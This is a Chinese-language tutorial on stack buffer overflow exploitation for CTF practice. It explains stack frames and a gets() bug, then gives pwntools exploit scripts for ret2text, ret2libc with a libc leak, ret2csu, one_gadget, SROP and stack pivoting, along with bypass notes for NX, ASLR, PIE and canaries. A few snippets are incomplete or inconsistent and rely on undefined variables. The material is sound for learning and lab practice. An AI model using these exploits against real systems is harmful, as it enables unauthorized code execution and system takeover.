---
title: 栈溢出
description: 二进制栈溢出漏洞原理与利用技术。
date: 2026-06-21T06:00:00.000Z
---


## 栈溢出

栈溢出是最经典的二进制漏洞利用技术，也是 PWN 方向的入门基础。

### 什么是栈溢出？

栈溢出是指程序在向栈缓冲区写入数据时，没有检查数据长度，导致数据溢出到栈的其他区域，覆盖了重要的控制信息（如返回地址）。

攻击者可以利用栈溢出来控制程序的执行流程，跳转到任意代码执行。

### 栈溢出的历史

栈溢出是历史上最早被发现和利用的漏洞类型之一。1988 年的 Morris 蠕虫就利用了 Unix 系统中的栈溢出漏洞。至今，栈溢出仍然是最常见和最危险的漏洞类型之一。

---

### 一、栈的基础知识

#### 栈帧结构

```
高地址
┌─────────────┐
│   参数 n     │
├─────────────┤
│   返回地址   │  ← 覆盖这里
├─────────────┤
│   保存的 EBP  │
├─────────────┤
│   局部变量   │  ← 溢出从这里开始
└─────────────┘
低地址
```

#### 函数调用过程

1. 参数压栈
2. call 指令（返回地址入栈）
3. push ebp（保存旧栈帧）
4. mov ebp, esp（建立新栈帧）
5. sub esp, N（分配局部变量空间）

---

### 二、漏洞原理

```c
void vulnerable() {
    char buf[64];
    gets(buf);  // 没有长度检查！
}
```

`gets()` 不检查输入长度，可以覆盖返回地址。

---

### 三、利用步骤

#### 1. 确定溢出偏移

使用 pattern：

```python
from pwn import *

# 生成 pattern
payload = cyclic(200)

# 运行程序，获取 EIP 值
eip_value = 0x4161616c

# 计算偏移
offset = cyclic_find(eip_value)
print(f"Offset: {offset}")
```

#### 2. 覆盖返回地址

```python
from pwn import *

offset = 76
shell_addr = 0x0804863b  # system("/bin/sh") 地址

payload = b'A' * offset
payload += p32(shell_addr)

io.sendline(payload)
```

#### 3. 跳转到 shellcode 或 ROP 链

---

### 四、安全机制与绕过

#### 1. NX（No-Execute）

栈内存不可执行。

**绕过：ROP（Return Oriented Programming）**

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)
pop_sh = rop.search(['pop', 'ret'])[0].address

payload = b'A' * offset
payload += p32(pop_sh)
payload += p32(shell_addr)
```

#### 2. ASLR

地址空间随机化。

**绕过：**
- 信息泄露
- 暴力破解（32位）
- Partial overwrite

#### 3. PIE

程序基址随机化。

**绕过：**
- 泄露程序基址
- Partial overwrite

#### 4. Canary

栈保护金丝雀。

**绕过：**
- 信息泄露
- 覆写 canary

---

### 五、常用工具

#### pwntools

```python
from pwn import *

# 连接远程
io = remote('target.com', 9999)

# 本地调试
io = process('./binary')

# 发送 payload
io.sendline(payload)

# 接收输出
io.recvline()

# 交互模式
io.interactive()
```

#### GDB + pwndbg

```bash
# 常用命令
b *0x401000       # 断点
info registers   # 寄存器
x/20wx $esp      # 栈
vmmap            # 内存映射
```

#### ROPgadget

```bash
# 搜索 gadget
ROPgadget --binary binary
ROPgadget --binary binary --only "pop|ret"
```

---

### 六、ret2libc：绕过 NX 与 ASLR

ret2libc 通过调用 libc 中的 `system("/bin/sh")` 来获取 shell，无需执行栈上的 shellcode。

#### 1. 原理

```
payload = padding + system_plt + 返回地址 + 参数地址
                     ↑            ↑           ↑
               调用 system()    system()   "/bin/sh"
                              执行完毕        字符串
                              的返回地址       地址
```

32 位参数通过栈传递，64 位参数通过寄存器传递（rdi, rsi, rdx...）。

#### 2. 32 位 ret2libc（无 ASLR）

```python
from pwn import *

elf = ELF('./ret2libc1')
io = process('./ret2libc1')

offset = 112
system_plt = elf.plt['system']
binsh_addr = next(elf.search(b'/bin/sh'))

payload = b'A' * offset
payload += p32(system_plt)  # 调用 system
payload += p32(0xdeadbeef)  # 返回地址（可以填任意值）
payload += p32(binsh_addr)  # 参数

io.sendline(payload)
io.interactive()
```

#### 3. 64 位 ret2libc（传参 + ROP）

64 位需要先用 pop rdi; ret gadget 设置 rdi 参数寄存器。

```python
from pwn import *

elf = ELF('./ret2libc2')
io = process('./ret2libc2')

# 查找 gadget
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

offset = 120
system_plt = elf.plt['system']
binsh_addr = next(elf.search(b'/bin/sh'))
ret = rop.find_gadget(['ret'])[0]  # 用于栈对齐

payload = b'A' * offset
payload += p64(ret)          # ret 对齐栈（16 字节对齐）
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(binsh_addr)   # rdi = "/bin/sh"
payload += p64(system_plt)   # call system

io.sendline(payload)
io.interactive()
```

#### 4. 泄露 libc + ASLR 绕过

```python
from pwn import *

elf = ELF('./ret2libc3')
libc = ELF('./libc.so.6')  # 或 libc.so.6 远程版本
io = process('./ret2libc3')

# 第一步：泄露 puts 的 GOT 地址
offset = 112
pop_rdi = 0x400803  # pop rdi; ret
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)    # rdi = puts@got
payload += p64(puts_plt)    # call puts(puts@got)
payload += p64(main_addr)   # 返回 main 再次执行

io.sendline(payload)
io.recvline()
puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))

log.info(f"puts address: {hex(puts_addr)}")

# 第二步：计算 libc 基址
libc_base = puts_addr - libc.symbols['puts']
log.info(f"libc base: {hex(libc_base)}")

system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 第三步：第二次溢出调用 system("/bin/sh")
payload2 = b'A' * offset
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

io.sendline(payload2)
io.interactive()
```

---

### 七、ret2csu：万能 gadget（64 位）

当找不到 pop rdi; ret 时，可以用 __libc_csu_init 中的万能 gadget。

```python
from pwn import *

elf = ELF('./binary')
io = process('./binary')

# __libc_csu_init 中的 gadget
csu_pop = 0x40123A  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x401220 # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

offset = 120

# 调用 write(1, write@got, 8) 泄露地址
payload = b'A' * offset
payload += p64(csu_pop)
payload += p64(0)           # rbx = 0
payload += p64(1)           # rbp = 1
payload += p64(elf.got['write'])  # r15 = write@got
payload += p64(8)           # r14 = rdx = 8
payload += p64(elf.got['write'])  # r13 = rsi = write@got
payload += p64(1)           # r12 = rdi = 1 (stdout)
payload += p64(csu_call)    # call
payload += p64(0) * 7       # 清空用过的寄存器
payload += p64(elf.symbols['main'])

io.sendline(payload)
io.recv(8)
write_addr = u64(io.recv(8))
log.info(f"write: {hex(write_addr)}")
```

---

### 八、one_gadget：一键 getshell

在 libc 中可能存在一条直接执行 `execve("/bin/sh", NULL, NULL)` 的 gadget。

```bash
# 查找 one_gadget
one_gadget ./libc.so.6

# 输出类似：
# 0xe3afe execve("/bin/sh", r15, r12)
# 0xe3b01 execve("/bin/sh", r15, r13)
# 0xe3b04 execve("/bin/sh", r15, rdx)
```

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
io = process('./binary')

# 泄露 libc 基址（同 ret2libc）
# ...

# one_gadget 地址
one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]
offset = 120

# 直接跳转到 one_gadget
libc_base = puts_addr - libc.symbols['puts']
payload = b'A' * offset
payload += p64(libc_base + one_gadget[0])

io.sendline(payload)
io.interactive()
```

---

### 九、SROP（Sigreturn-Oriented Programming）

利用信号处理机制，通过 sigreturn 系统调用设置所有寄存器的值。

```python
from pwn import *

context.arch = 'amd64'

elf = ELF('./binary')
io = process('./binary')

# 构造 SigreturnFrame
frame = SigreturnFrame()
frame.rdi = next(elf.search(b'/bin/sh'))
frame.rsi = 0
frame.rdx = 0
frame.rax = constants.SYS_execve  # 59
frame.rip = libc_base + libc.symbols['syscall']  # syscall 地址

# 找到 syscall; ret 和 sigreturn 的 gadget
syscall_ret = 0x401234
mov_rax_15 = 0x401111  # mov eax, 15; ret 或类似 gadget

offset = 120
payload = b'A' * offset
payload += p64(mov_rax_15)  # rax = 15 (SYS_rt_sigreturn)
payload += p64(syscall_ret)  # syscall
payload += bytes(frame)     # 伪造的信号帧

io.sendline(payload)
io.interactive()
```

---

### 十、Stack Pivoting（栈迁移）

当溢出空间不足时，将栈指针迁移到可控的内存区域。

```python
from pwn import *

elf = ELF('./binary')
io = process('./binary')

# 需要的 gadget
leave_ret = 0x401111  # leave; ret
# leave 等价于：mov rsp, rbp; pop rbp

# 第一步：先泄露 stack 地址
# ...

# 第二步：用栈迁移
bss_addr = 0x601000 + 0x800  # BSS 段可写区域
fake_rbp = bss_addr

# 构造的 payload
# 首先在 BSS 段布置 ROP 链
# ...

# 然后在栈溢出点
offset = 120
payload = b'A' * offset
payload += p64(fake_rbp)    # 覆盖 rbp 为 BSS 地址
payload += p64(leave_ret)   # leave; ret
# leave: rsp = fake_rbp; pop rbp（rsp 移到 BSS 区域）
# ret: 执行 BSS 区域中的 ROP 链

io.sendline(payload)
io.interactive()
```

---

### 十一、经典例题

```python
from pwn import *

# 设置
context.arch = 'i386'
context.log_level = 'debug'

# 连接
io = process('./ret2text')

# 构造 payload
offset = 108
system_addr = 0x08048559  # system("/bin/sh") 地址

payload = b'A' * offset
payload += p32(system_addr)

# 发送
io.sendline(payload)
io.interactive()
```

---

### 十二、练习平台

- [pwnable.kr](http://pwnable.kr/)
- [ROP Emporium](https://ropemporium.com/)
- [BUUCTF PWN 方向](https://buuoj.cn/)
